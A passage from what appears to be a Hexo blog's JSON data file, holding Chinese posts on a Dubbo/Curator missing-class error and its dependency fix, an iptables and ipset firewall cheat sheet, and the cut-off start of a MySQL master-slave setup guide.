com.alibaba.dubbo.config.ServiceConfig.doExportUrlsFor1Protocol(ServiceConfig.java:513)\n\tat com.alibaba.dubbo.config.ServiceConfig.doExportUrls(ServiceConfig.java:358)\n\tat com.alibaba.dubbo.config.ServiceConfig.doExport(ServiceConfig.java:317)\n\tat com.alibaba.dubbo.config.ServiceConfig.export(ServiceConfig.java:216)\n\tat com.alibaba.dubbo.config.spring.ServiceBean.export(ServiceBean.java:291)\n\tat com.alibaba.dubbo.config.spring.ServiceBean.onApplicationEvent(ServiceBean.java:131)\n\tat com.alibaba.dubbo.config.spring.ServiceBean.onApplicationEvent(ServiceBean.java:53)\n\tat org.springframework.context.event.SimpleApplicationEventMulticaster.doInvokeListener(SimpleApplicationEventMulticaster.java:172)\n\tat org.springframework.context.event.SimpleApplicationEventMulticaster.invokeListener(SimpleApplicationEventMulticaster.java:165)\n\tat org.springframework.context.event.SimpleApplicationEventMulticaster.multicastEvent(SimpleApplicationEventMulticaster.java:139)\n\tat org.springframework.context.support.AbstractApplicationContext.publishEvent(AbstractApplicationContext.java:398)\n\tat org.springframework.context.support.AbstractApplicationContext.publishEvent(AbstractApplicationContext.java:355)\n\tat org.springframework.context.support.AbstractApplicationContext.finishRefresh(AbstractApplicationContext.java:882)\n\tat org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:549)\n\tat org.springframework.context.support.ClassPathXmlApplicationContext.<init>(ClassPathXmlApplicationContext.java:144)\n\tat org.springframework.context.support.ClassPathXmlApplicationContext.<init>(ClassPathXmlApplicationContext.java:95)\n\tat com.uetty.dbo.service.App.main(App.java:18)\nCaused by: java.lang.ClassNotFoundException: org.apache.curator.RetryPolicy\n\tat java.net.URLClassLoader.findClass(URLClassLoader.java:381)\n\tat java.lang.ClassLoader.loadClass(ClassLoader.java:424)\n\tat sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:338)\n\tat java.lang.ClassLoader.loadClass(ClassLoader.java:357)\n\t... 29 more\n```\n\n确保包含如下依赖，注意该依赖所依赖的的zookeeper的jar版本需与zookeeper服务器版本匹配，具体版本对应见zookeeper文档或者一个个版本调试一下试试（如果与zookeeper版本匹配问题会报KeeperErrorCode = Unimplemented错误）\n```\n<dependency>\n    <groupId>org.apache.curator</groupId>\n\t<artifactId>curator-framework</artifactId>\n</dependency>\n```\n\n","slug":"dubbo-retry-policy","published":1,"updated":"2020-01-23T08:21:31.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck5qhi060000wg0ukzftjde94","content":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Exception in thread &quot;main&quot; java.lang.NoClassDefFoundError: org/apache/curator/RetryPolicy</span><br><span class=\"line\">\tat com.alibaba.dubbo.remoting.zookeeper.curator.CuratorZookeeperTransporter.connect(CuratorZookeeperTransporter.java:27)</span><br><span class=\"line\">\tat com.alibaba.dubbo.remoting.zookeeper.ZookeeperTransporter$Adaptive.connect(ZookeeperTransporter$Adaptive.java)</span><br><span class=\"line\">\tat com.alibaba.dubbo.registry.zookeeper.ZookeeperRegistry.&lt;init&gt;(ZookeeperRegistry.java:69)</span><br><span class=\"line\">\tat com.alibaba.dubbo.registry.zookeeper.ZookeeperRegistryFactory.createRegistry(ZookeeperRegistryFactory.java:38)</span><br><span class=\"line\">\tat com.alibaba.dubbo.registry.support.AbstractRegistryFactory.getRegistry(AbstractRegistryFactory.java:96)</span><br><span class=\"line\">\tat com.alibaba.dubbo.registry.RegistryFactory$Adaptive.getRegistry(RegistryFactory$Adaptive.java)</span><br><span class=\"line\">\tat com.alibaba.dubbo.registry.integration.RegistryProtocol.getRegistry(RegistryProtocol.java:203)</span><br><span class=\"line\">\tat com.alibaba.dubbo.registry.integration.RegistryProtocol.export(RegistryProtocol.java:137)</span><br><span class=\"line\">\tat com.alibaba.dubbo.rpc.protocol.ProtocolFilterWrapper.export(ProtocolFilterWrapper.java:98)</span><br><span class=\"line\">\tat com.alibaba.dubbo.rpc.protocol.ProtocolListenerWrapper.export(ProtocolListenerWrapper.java:55)</span><br><span class=\"line\">\tat com.alibaba.dubbo.qos.protocol.QosProtocolWrapper.export(QosProtocolWrapper.java:60)</span><br><span class=\"line\">\tat com.alibaba.dubbo.rpc.Protocol$Adaptive.export(Protocol$Adaptive.java)</span><br><span class=\"line\">\tat com.alibaba.dubbo.config.ServiceConfig.doExportUrlsFor1Protocol(ServiceConfig.java:513)</span><br><span class=\"line\">\tat com.alibaba.dubbo.config.ServiceConfig.doExportUrls(ServiceConfig.java:358)</span><br><span class=\"line\">\tat com.alibaba.dubbo.config.ServiceConfig.doExport(ServiceConfig.java:317)</span><br><span class=\"line\">\tat com.alibaba.dubbo.config.ServiceConfig.export(ServiceConfig.java:216)</span><br><span class=\"line\">\tat com.alibaba.dubbo.config.spring.ServiceBean.export(ServiceBean.java:291)</span><br><span class=\"line\">\tat com.alibaba.dubbo.config.spring.ServiceBean.onApplicationEvent(ServiceBean.java:131)</span><br><span class=\"line\">\tat com.alibaba.dubbo.config.spring.ServiceBean.onApplicationEvent(ServiceBean.java:53)</span><br><span class=\"line\">\tat org.springframework.context.event.SimpleApplicationEventMulticaster.doInvokeListener(SimpleApplicationEventMulticaster.java:172)</span><br><span class=\"line\">\tat org.springframework.context.event.SimpleApplicationEventMulticaster.invokeListener(SimpleApplicationEventMulticaster.java:165)</span><br><span class=\"line\">\tat org.springframework.context.event.SimpleApplicationEventMulticaster.multicastEvent(SimpleApplicationEventMulticaster.java:139)</span><br><span class=\"line\">\tat org.springframework.context.support.AbstractApplicationContext.publishEvent(AbstractApplicationContext.java:398)</span><br><span class=\"line\">\tat org.springframework.context.support.AbstractApplicationContext.publishEvent(AbstractApplicationContext.java:355)</span><br><span class=\"line\">\tat org.springframework.context.support.AbstractApplicationContext.finishRefresh(AbstractApplicationContext.java:882)</span><br><span class=\"line\">\tat org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:549)</span><br><span class=\"line\">\tat org.springframework.context.support.ClassPathXmlApplicationContext.&lt;init&gt;(ClassPathXmlApplicationContext.java:144)</span><br><span class=\"line\">\tat org.springframework.context.support.ClassPathXmlApplicationContext.&lt;init&gt;(ClassPathXmlApplicationContext.java:95)</span><br><span class=\"line\">\tat com.uetty.dbo.service.App.main(App.java:18)</span><br><span class=\"line\">Caused by: java.lang.ClassNotFoundException: org.apache.curator.RetryPolicy</span><br><span class=\"line\">\tat java.net.URLClassLoader.findClass(URLClassLoader.java:381)</span><br><span class=\"line\">\tat java.lang.ClassLoader.loadClass(ClassLoader.java:424)</span><br><span class=\"line\">\tat sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:338)</span><br><span class=\"line\">\tat java.lang.ClassLoader.loadClass(ClassLoader.java:357)</span><br><span class=\"line\">\t... 29 more</span><br></pre></td></tr></table></figure>\n\n<p>确保包含如下依赖，注意该依赖所依赖的的zookeeper的jar版本需与zookeeper服务器版本匹配，具体版本对应见zookeeper文档或者一个个版本调试一下试试（如果与zookeeper版本匹配问题会报KeeperErrorCode = Unimplemented错误）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;org.apache.curator&lt;/groupId&gt;</span><br><span class=\"line\">\t&lt;artifactId&gt;curator-framework&lt;/artifactId&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Exception in thread &quot;main&quot; java.lang.NoClassDefFoundError: org/apache/curator/RetryPolicy</span><br><span class=\"line\">\tat com.alibaba.dubbo.remoting.zookeeper.curator.CuratorZookeeperTransporter.connect(CuratorZookeeperTransporter.java:27)</span><br><span class=\"line\">\tat com.alibaba.dubbo.remoting.zookeeper.ZookeeperTransporter$Adaptive.connect(ZookeeperTransporter$Adaptive.java)</span><br><span class=\"line\">\tat com.alibaba.dubbo.registry.zookeeper.ZookeeperRegistry.&lt;init&gt;(ZookeeperRegistry.java:69)</span><br><span class=\"line\">\tat com.alibaba.dubbo.registry.zookeeper.ZookeeperRegistryFactory.createRegistry(ZookeeperRegistryFactory.java:38)</span><br><span class=\"line\">\tat com.alibaba.dubbo.registry.support.AbstractRegistryFactory.getRegistry(AbstractRegistryFactory.java:96)</span><br><span class=\"line\">\tat com.alibaba.dubbo.registry.RegistryFactory$Adaptive.getRegistry(RegistryFactory$Adaptive.java)</span><br><span class=\"line\">\tat com.alibaba.dubbo.registry.integration.RegistryProtocol.getRegistry(RegistryProtocol.java:203)</span><br><span class=\"line\">\tat com.alibaba.dubbo.registry.integration.RegistryProtocol.export(RegistryProtocol.java:137)</span><br><span class=\"line\">\tat com.alibaba.dubbo.rpc.protocol.ProtocolFilterWrapper.export(ProtocolFilterWrapper.java:98)</span><br><span class=\"line\">\tat com.alibaba.dubbo.rpc.protocol.ProtocolListenerWrapper.export(ProtocolListenerWrapper.java:55)</span><br><span class=\"line\">\tat com.alibaba.dubbo.qos.protocol.QosProtocolWrapper.export(QosProtocolWrapper.java:60)</span><br><span class=\"line\">\tat com.alibaba.dubbo.rpc.Protocol$Adaptive.export(Protocol$Adaptive.java)</span><br><span class=\"line\">\tat com.alibaba.dubbo.config.ServiceConfig.doExportUrlsFor1Protocol(ServiceConfig.java:513)</span><br><span class=\"line\">\tat com.alibaba.dubbo.config.ServiceConfig.doExportUrls(ServiceConfig.java:358)</span><br><span class=\"line\">\tat com.alibaba.dubbo.config.ServiceConfig.doExport(ServiceConfig.java:317)</span><br><span class=\"line\">\tat com.alibaba.dubbo.config.ServiceConfig.export(ServiceConfig.java:216)</span><br><span class=\"line\">\tat com.alibaba.dubbo.config.spring.ServiceBean.export(ServiceBean.java:291)</span><br><span class=\"line\">\tat com.alibaba.dubbo.config.spring.ServiceBean.onApplicationEvent(ServiceBean.java:131)</span><br><span class=\"line\">\tat com.alibaba.dubbo.config.spring.ServiceBean.onApplicationEvent(ServiceBean.java:53)</span><br><span class=\"line\">\tat org.springframework.context.event.SimpleApplicationEventMulticaster.doInvokeListener(SimpleApplicationEventMulticaster.java:172)</span><br><span class=\"line\">\tat org.springframework.context.event.SimpleApplicationEventMulticaster.invokeListener(SimpleApplicationEventMulticaster.java:165)</span><br><span class=\"line\">\tat org.springframework.context.event.SimpleApplicationEventMulticaster.multicastEvent(SimpleApplicationEventMulticaster.java:139)</span><br><span class=\"line\">\tat org.springframework.context.support.AbstractApplicationContext.publishEvent(AbstractApplicationContext.java:398)</span><br><span class=\"line\">\tat org.springframework.context.support.AbstractApplicationContext.publishEvent(AbstractApplicationContext.java:355)</span><br><span class=\"line\">\tat org.springframework.context.support.AbstractApplicationContext.finishRefresh(AbstractApplicationContext.java:882)</span><br><span class=\"line\">\tat org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:549)</span><br><span class=\"line\">\tat org.springframework.context.support.ClassPathXmlApplicationContext.&lt;init&gt;(ClassPathXmlApplicationContext.java:144)</span><br><span class=\"line\">\tat org.springframework.context.support.ClassPathXmlApplicationContext.&lt;init&gt;(ClassPathXmlApplicationContext.java:95)</span><br><span class=\"line\">\tat com.uetty.dbo.service.App.main(App.java:18)</span><br><span class=\"line\">Caused by: java.lang.ClassNotFoundException: org.apache.curator.RetryPolicy</span><br><span class=\"line\">\tat java.net.URLClassLoader.findClass(URLClassLoader.java:381)</span><br><span class=\"line\">\tat java.lang.ClassLoader.loadClass(ClassLoader.java:424)</span><br><span class=\"line\">\tat sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:338)</span><br><span class=\"line\">\tat java.lang.ClassLoader.loadClass(ClassLoader.java:357)</span><br><span class=\"line\">\t... 29 more</span><br></pre></td></tr></table></figure>\n\n<p>确保包含如下依赖，注意该依赖所依赖的的zookeeper的jar版本需与zookeeper服务器版本匹配，具体版本对应见zookeeper文档或者一个个版本调试一下试试（如果与zookeeper版本匹配问题会报KeeperErrorCode = Unimplemented错误）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;org.apache.curator&lt;/groupId&gt;</span><br><span class=\"line\">\t&lt;artifactId&gt;curator-framework&lt;/artifactId&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>\n\n"},{"title":"iptables 笔记","date":"2018-12-30T08:13:02.000Z","keywords":"iptables","rId":"MB-18123002","_content":"\n## 结构\n\n![iptables总体](../static/MB18123001-1.png)\n\n## iptables命令\n显示列表：`iptables -t filter -L -n`      -t参数指定显示哪个链，默认filter链，加-v显示更详细信息，可看到哪张网卡流入流出 \n\n\n\n清空设置：`iptables -F` \n\n\n\n阻止特定源ip（111.111.11.11）对目的ip（10.18.139.82）的8080端口访问：`iptables -I DOCKER -s 111.111.11.11 -d 10.18.139.82 -p TCP --dport 8080 -j DROP`  \n\n\n\n添加一条开放端口的规则： `iptables -A INPUT -p tcp --dport 22 -j ACCEPT`  -A表示添加规则 \n\n\n\n替换一条规则为开放220端口：`iptables -R INPUT 1 -p tcp --dport 220 -j ACCEPT` -R表示替换规则，`INPUT 1`表示INPUT链路的第1条规则，规则行号用`iptables -L -n --line-number`命令查看 \n\n\n\n插入一条规则：`iptables -I INPUT 3 -p tcp --dport 220 -j ACCEPT`  -I表示插入规则\n\n\n\n添加一条禁止端口的规则： `iptables -A INPUT -p tcp --dport 8080 -j DROP` \n\n\n\n删除一条规则：先使用 `iptables -L -n --line-number` 查看number，之后使用`iptables -D INPUT 3` 删除number号对应的规则 \n\n\n\n通常设置只通过部分端口的规则需要设置允许换回链路，以及允许主动访问外网时外网的响应流量流入：`iptables -A INPUT -i lo -j ACCEPT`、`iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT`，第一条为环回链路，第二条为以连接或程序启动的向外端口允许流入\n\n\n\n设置环回链路规则时，通过`iptable -L -n`命令看到不到详细信息会误以为通过了全部端口，使用`iptables -L -n -v`命令看详细信息，才可看到实际规则\n\n\n\n一个规则里设置多个端口：`iptables -A INPUT -p tcp -m multiport --destination-ports 22,3306,443,80 -j ACCEPT`\n\n\n\n命令里设置iptables规则，重启后将失效，通过`iptables-save > /root/iptables.conf`保存配置到文件里，重启后使用`iptables-restore < /root/iptables.conf`恢复配置。如果service iptables可以使用，则可以直接用`service iptables save`保存 \n\n\n\n## ip黑名单\n\n结合使用ipset软件设置ip黑名单\n\n安装软件：`apt-get install ipset`\n\n创建名单：`ipset create blacklist hash:net`    最后的参数还可以是：`hash:ip`、`hash:ip,port`等，名单是以hash方式存储的，所以不会怎么影响性能，hash size默认能存储1024个\n\n创建自动过期的名单：`ipset create timoutlist hash:ip timeout 300`    300秒后自动过期\n\n添加ip：`ipset add blacklist 1.1.1.1`\n\n添加ip地址段：`ipset add blacklist 1.1.1.0/24` 前24byte的地址匹配\n\n如果集合是ip,port的形式：`ipset add blacklist 1.1.1.1,80` 添加1.1.1.1的ip的80端口\n\n查看列表：`ipset list`\n\n查看集合内内容：`ipset list blacklist`\n\n清空所有集合：`ipset flush`\n\n清空单个集合：`ipset flush blacklist`\n\n从集合删除内容：`ipset del blacklist x.x.x.x`\n\n销毁集合：`ipset destroy blacklist`\n\n\n\n使用ipset名单：`iptables -A INPUT -m set --match-set blacklist src -p tcp -j DROP`\n\n如果是设置不匹配名单添加`!`符合即可：`iptables -A INPUT -m set ! --match-set blacklist src -p tcp -j DROP`\n\n\n\n保存与恢复：通过`ipset save > /root/ipset.conf`保存配置到文件里，重使用`ipset restore < /root/ipset.conf`恢复配置","source":"_posts/2018-12-30_iptables.md","raw":"---\ntitle: iptables 笔记\ndate: 2018-12-30 16:13:02\ntags: linux\npermalink: iptables\nkeywords: iptables\nrId: MB-18123002\n---\n\n## 结构\n\n![iptables总体](../static/MB18123001-1.png)\n\n## iptables命令\n显示列表：`iptables -t filter -L -n`      -t参数指定显示哪个链，默认filter链，加-v显示更详细信息，可看到哪张网卡流入流出 \n\n\n\n清空设置：`iptables -F` \n\n\n\n阻止特定源ip（111.111.11.11）对目的ip（10.18.139.82）的8080端口访问：`iptables -I DOCKER -s 111.111.11.11 -d 10.18.139.82 -p TCP --dport 8080 -j DROP`  \n\n\n\n添加一条开放端口的规则： `iptables -A INPUT -p tcp --dport 22 -j ACCEPT`  -A表示添加规则 \n\n\n\n替换一条规则为开放220端口：`iptables -R INPUT 1 -p tcp --dport 220 -j ACCEPT` -R表示替换规则，`INPUT 1`表示INPUT链路的第1条规则，规则行号用`iptables -L -n --line-number`命令查看 \n\n\n\n插入一条规则：`iptables -I INPUT 3 -p tcp --dport 220 -j ACCEPT`  -I表示插入规则\n\n\n\n添加一条禁止端口的规则： `iptables -A INPUT -p tcp --dport 8080 -j DROP` \n\n\n\n删除一条规则：先使用 `iptables -L -n --line-number` 查看number，之后使用`iptables -D INPUT 3` 删除number号对应的规则 \n\n\n\n通常设置只通过部分端口的规则需要设置允许换回链路，以及允许主动访问外网时外网的响应流量流入：`iptables -A INPUT -i lo -j ACCEPT`、`iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT`，第一条为环回链路，第二条为以连接或程序启动的向外端口允许流入\n\n\n\n设置环回链路规则时，通过`iptable -L -n`命令看到不到详细信息会误以为通过了全部端口，使用`iptables -L -n -v`命令看详细信息，才可看到实际规则\n\n\n\n一个规则里设置多个端口：`iptables -A INPUT -p tcp -m multiport --destination-ports 22,3306,443,80 -j ACCEPT`\n\n\n\n命令里设置iptables规则，重启后将失效，通过`iptables-save > /root/iptables.conf`保存配置到文件里，重启后使用`iptables-restore < /root/iptables.conf`恢复配置。如果service iptables可以使用，则可以直接用`service iptables save`保存 \n\n\n\n## ip黑名单\n\n结合使用ipset软件设置ip黑名单\n\n安装软件：`apt-get install ipset`\n\n创建名单：`ipset create blacklist hash:net`    最后的参数还可以是：`hash:ip`、`hash:ip,port`等，名单是以hash方式存储的，所以不会怎么影响性能，hash size默认能存储1024个\n\n创建自动过期的名单：`ipset create timoutlist hash:ip timeout 300`    300秒后自动过期\n\n添加ip：`ipset add blacklist 1.1.1.1`\n\n添加ip地址段：`ipset add blacklist 1.1.1.0/24` 前24byte的地址匹配\n\n如果集合是ip,port的形式：`ipset add blacklist 1.1.1.1,80` 添加1.1.1.1的ip的80端口\n\n查看列表：`ipset list`\n\n查看集合内内容：`ipset list blacklist`\n\n清空所有集合：`ipset flush`\n\n清空单个集合：`ipset flush blacklist`\n\n从集合删除内容：`ipset del blacklist x.x.x.x`\n\n销毁集合：`ipset destroy blacklist`\n\n\n\n使用ipset名单：`iptables -A INPUT -m set --match-set blacklist src -p tcp -j DROP`\n\n如果是设置不匹配名单添加`!`符合即可：`iptables -A INPUT -m set ! --match-set blacklist src -p tcp -j DROP`\n\n\n\n保存与恢复：通过`ipset save > /root/ipset.conf`保存配置到文件里，重使用`ipset restore < /root/ipset.conf`恢复配置","slug":"iptables","published":1,"updated":"2020-01-23T08:21:31.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck5qhi061000yg0ukhptqpntl","content":"<h2 id=\"结构\"><a href=\"#结构\" class=\"headerlink\" title=\"结构\"></a>结构</h2><p><img src=\"../static/MB18123001-1.png\" alt=\"iptables总体\"></p>\n<h2 id=\"iptables命令\"><a href=\"#iptables命令\" class=\"headerlink\" title=\"iptables命令\"></a>iptables命令</h2><p>显示列表：<code>iptables -t filter -L -n</code>      -t参数指定显示哪个链，默认filter链，加-v显示更详细信息，可看到哪张网卡流入流出 </p>\n<p>清空设置：<code>iptables -F</code> </p>\n<p>阻止特定源ip（111.111.11.11）对目的ip（10.18.139.82）的8080端口访问：<code>iptables -I DOCKER -s 111.111.11.11 -d 10.18.139.82 -p TCP --dport 8080 -j DROP</code>  </p>\n<p>添加一条开放端口的规则： <code>iptables -A INPUT -p tcp --dport 22 -j ACCEPT</code>  -A表示添加规则 </p>\n<p>替换一条规则为开放220端口：<code>iptables -R INPUT 1 -p tcp --dport 220 -j ACCEPT</code> -R表示替换规则，<code>INPUT 1</code>表示INPUT链路的第1条规则，规则行号用<code>iptables -L -n --line-number</code>命令查看 </p>\n<p>插入一条规则：<code>iptables -I INPUT 3 -p tcp --dport 220 -j ACCEPT</code>  -I表示插入规则</p>\n<p>添加一条禁止端口的规则： <code>iptables -A INPUT -p tcp --dport 8080 -j DROP</code> </p>\n<p>删除一条规则：先使用 <code>iptables -L -n --line-number</code> 查看number，之后使用<code>iptables -D INPUT 3</code> 删除number号对应的规则 </p>\n<p>通常设置只通过部分端口的规则需要设置允许换回链路，以及允许主动访问外网时外网的响应流量流入：<code>iptables -A INPUT -i lo -j ACCEPT</code>、<code>iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT</code>，第一条为环回链路，第二条为以连接或程序启动的向外端口允许流入</p>\n<p>设置环回链路规则时，通过<code>iptable -L -n</code>命令看到不到详细信息会误以为通过了全部端口，使用<code>iptables -L -n -v</code>命令看详细信息，才可看到实际规则</p>\n<p>一个规则里设置多个端口：<code>iptables -A INPUT -p tcp -m multiport --destination-ports 22,3306,443,80 -j ACCEPT</code></p>\n<p>命令里设置iptables规则，重启后将失效，通过<code>iptables-save &gt; /root/iptables.conf</code>保存配置到文件里，重启后使用<code>iptables-restore &lt; /root/iptables.conf</code>恢复配置。如果service iptables可以使用，则可以直接用<code>service iptables save</code>保存 </p>\n<h2 id=\"ip黑名单\"><a href=\"#ip黑名单\" class=\"headerlink\" title=\"ip黑名单\"></a>ip黑名单</h2><p>结合使用ipset软件设置ip黑名单</p>\n<p>安装软件：<code>apt-get install ipset</code></p>\n<p>创建名单：<code>ipset create blacklist hash:net</code>    最后的参数还可以是：<code>hash:ip</code>、<code>hash:ip,port</code>等，名单是以hash方式存储的，所以不会怎么影响性能，hash size默认能存储1024个</p>\n<p>创建自动过期的名单：<code>ipset create timoutlist hash:ip timeout 300</code>    300秒后自动过期</p>\n<p>添加ip：<code>ipset add blacklist 1.1.1.1</code></p>\n<p>添加ip地址段：<code>ipset add blacklist 1.1.1.0/24</code> 前24byte的地址匹配</p>\n<p>如果集合是ip,port的形式：<code>ipset add blacklist 1.1.1.1,80</code> 添加1.1.1.1的ip的80端口</p>\n<p>查看列表：<code>ipset list</code></p>\n<p>查看集合内内容：<code>ipset list blacklist</code></p>\n<p>清空所有集合：<code>ipset flush</code></p>\n<p>清空单个集合：<code>ipset flush blacklist</code></p>\n<p>从集合删除内容：<code>ipset del blacklist x.x.x.x</code></p>\n<p>销毁集合：<code>ipset destroy blacklist</code></p>\n<p>使用ipset名单：<code>iptables -A INPUT -m set --match-set blacklist src -p tcp -j DROP</code></p>\n<p>如果是设置不匹配名单添加<code>!</code>符合即可：<code>iptables -A INPUT -m set ! --match-set blacklist src -p tcp -j DROP</code></p>\n<p>保存与恢复：通过<code>ipset save &gt; /root/ipset.conf</code>保存配置到文件里，重使用<code>ipset restore &lt; /root/ipset.conf</code>恢复配置</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"结构\"><a href=\"#结构\" class=\"headerlink\" title=\"结构\"></a>结构</h2><p><img src=\"../static/MB18123001-1.png\" alt=\"iptables总体\"></p>\n<h2 id=\"iptables命令\"><a href=\"#iptables命令\" class=\"headerlink\" title=\"iptables命令\"></a>iptables命令</h2><p>显示列表：<code>iptables -t filter -L -n</code>      -t参数指定显示哪个链，默认filter链，加-v显示更详细信息，可看到哪张网卡流入流出 </p>\n<p>清空设置：<code>iptables -F</code> </p>\n<p>阻止特定源ip（111.111.11.11）对目的ip（10.18.139.82）的8080端口访问：<code>iptables -I DOCKER -s 111.111.11.11 -d 10.18.139.82 -p TCP --dport 8080 -j DROP</code>  </p>\n<p>添加一条开放端口的规则： <code>iptables -A INPUT -p tcp --dport 22 -j ACCEPT</code>  -A表示添加规则 </p>\n<p>替换一条规则为开放220端口：<code>iptables -R INPUT 1 -p tcp --dport 220 -j ACCEPT</code> -R表示替换规则，<code>INPUT 1</code>表示INPUT链路的第1条规则，规则行号用<code>iptables -L -n --line-number</code>命令查看 </p>\n<p>插入一条规则：<code>iptables -I INPUT 3 -p tcp --dport 220 -j ACCEPT</code>  -I表示插入规则</p>\n<p>添加一条禁止端口的规则： <code>iptables -A INPUT -p tcp --dport 8080 -j DROP</code> </p>\n<p>删除一条规则：先使用 <code>iptables -L -n --line-number</code> 查看number，之后使用<code>iptables -D INPUT 3</code> 删除number号对应的规则 </p>\n<p>通常设置只通过部分端口的规则需要设置允许换回链路，以及允许主动访问外网时外网的响应流量流入：<code>iptables -A INPUT -i lo -j ACCEPT</code>、<code>iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT</code>，第一条为环回链路，第二条为以连接或程序启动的向外端口允许流入</p>\n<p>设置环回链路规则时，通过<code>iptable -L -n</code>命令看到不到详细信息会误以为通过了全部端口，使用<code>iptables -L -n -v</code>命令看详细信息，才可看到实际规则</p>\n<p>一个规则里设置多个端口：<code>iptables -A INPUT -p tcp -m multiport --destination-ports 22,3306,443,80 -j ACCEPT</code></p>\n<p>命令里设置iptables规则，重启后将失效，通过<code>iptables-save &gt; /root/iptables.conf</code>保存配置到文件里，重启后使用<code>iptables-restore &lt; /root/iptables.conf</code>恢复配置。如果service iptables可以使用，则可以直接用<code>service iptables save</code>保存 </p>\n<h2 id=\"ip黑名单\"><a href=\"#ip黑名单\" class=\"headerlink\" title=\"ip黑名单\"></a>ip黑名单</h2><p>结合使用ipset软件设置ip黑名单</p>\n<p>安装软件：<code>apt-get install ipset</code></p>\n<p>创建名单：<code>ipset create blacklist hash:net</code>    最后的参数还可以是：<code>hash:ip</code>、<code>hash:ip,port</code>等，名单是以hash方式存储的，所以不会怎么影响性能，hash size默认能存储1024个</p>\n<p>创建自动过期的名单：<code>ipset create timoutlist hash:ip timeout 300</code>    300秒后自动过期</p>\n<p>添加ip：<code>ipset add blacklist 1.1.1.1</code></p>\n<p>添加ip地址段：<code>ipset add blacklist 1.1.1.0/24</code> 前24byte的地址匹配</p>\n<p>如果集合是ip,port的形式：<code>ipset add blacklist 1.1.1.1,80</code> 添加1.1.1.1的ip的80端口</p>\n<p>查看列表：<code>ipset list</code></p>\n<p>查看集合内内容：<code>ipset list blacklist</code></p>\n<p>清空所有集合：<code>ipset flush</code></p>\n<p>清空单个集合：<code>ipset flush blacklist</code></p>\n<p>从集合删除内容：<code>ipset del blacklist x.x.x.x</code></p>\n<p>销毁集合：<code>ipset destroy blacklist</code></p>\n<p>使用ipset名单：<code>iptables -A INPUT -m set --match-set blacklist src -p tcp -j DROP</code></p>\n<p>如果是设置不匹配名单添加<code>!</code>符合即可：<code>iptables -A INPUT -m set ! --match-set blacklist src -p tcp -j DROP</code></p>\n<p>保存与恢复：通过<code>ipset save &gt; /root/ipset.conf</code>保存配置到文件里，重使用<code>ipset restore &lt; /root/ipset.conf</code>恢复配置</p>\n"},{"title":"MySQL主从同步配置","date":"2018-12-30T05:23:29.000Z","keywords":"mysql, 主从同步","rId":"MB-18123001","_content":"\n为了方便操作，这里使用docker\n\n## 环境准备\n1. 创建网桥 `docker network create nw-ms`  \n2. 主MySQL环境：`docker run -it --name=master --network=nw-ms --network-alias=master uetty/mysql:5.7.23`  \n3. `vim 